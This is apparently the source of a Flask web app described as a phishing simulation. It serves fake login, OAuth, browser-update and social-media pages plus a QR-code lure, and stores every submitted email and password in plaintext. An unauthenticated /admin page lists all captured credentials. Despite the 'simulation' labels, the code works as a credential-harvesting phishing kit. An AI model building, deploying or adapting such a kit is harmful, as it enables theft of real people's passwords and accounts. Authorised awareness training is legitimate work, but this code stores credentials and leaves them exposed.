from flask import Flask, render_template, request, redirect
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import qrcode
import os

app = Flask(__name__)

# Database configuration
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///events.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# Database table
class CredentialEvent(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    page = db.Column(db.String(200))
    email = db.Column(db.String(200))
    password = db.Column(db.String(200))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

@app.before_request
def create_tables():
    db.create_all()

# Home Page
@app.route("/")
def index():
    return render_template("index.html")

# ---------------------------
# LOGIN SIMULATION
# ---------------------------
@app.route("/login", methods=["GET","POST"])
def login():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")

        # Store dummy credentials
        event = CredentialEvent(page="login_page", email=email, password=password)
        db.session.add(event)
        db.session.commit()

        return redirect("/thankyou")

    return render_template("login.html")


# ---------------------------
# OAUTH SIMULATION
# ---------------------------
@app.route("/oauth", methods=["GET","POST"])
def oauth():
    if request.method == "POST":
        email = request.form.get("email")
        passw = request.form.get("password")

        event = CredentialEvent(page="oauth_page", email=email, password=passw)
        db.session.add(event)
        db.session.commit()

        return redirect("/thankyou")

    return render_template("oauth.html")


# ---------------------------
# BROWSER UPDATE SIMULATION
# ---------------------------
@app.route("/browser-update", methods=["GET","POST"])
def browser_update():
    if request.method == "POST":
        email = request.form.get("email")
        passw = request.form.get("password")

        event = CredentialEvent(page="browser_update", email=email, password=passw)
        db.session.add(event)
        db.session.commit()

        return redirect("/thankyou")

    return render_template("browser_update.html")


# ---------------------------
# SOCIAL MEDIA SIMULATION
# ---------------------------
@app.route("/social", methods=["GET","POST"])
def social():
    if request.method == "POST":
        email = request.form.get("email")
        passw = request.form.get("password")

        event = CredentialEvent(page="social_media", email=email, password=passw)
        db.session.add(event)
        db.session.commit()

        return redirect("/thankyou")

    return render_template("social.html")


# ---------------------------
# QR PHISHING SIMULATION
# ---------------------------
@app.route("/qr")
def qr_page():
    qr_path = "static/qr.png"

    # Get Base URL from environment or default to localhost
    base_url = os.environ.get("BASE_URL", "http://127.0.0.1:5000")

    if not os.path.exists(qr_path):
        img = qrcode.make(f"{base_url}/login")
        img.save(qr_path)

    return render_template("qr.html", qr_image=qr_path)


# ---------------------------
# THANK YOU PAGE
# ---------------------------
@app.route("/thankyou")
def thankyou():
    return render_template("thankyou.html")


# ---------------------------
# ADMIN PANEL
# ---------------------------
@app.route("/admin")
def admin():
    data = CredentialEvent.query.all()
    return render_template("admin.html", data=data)


if __name__ == "__main__":
    app.run(debug=True)
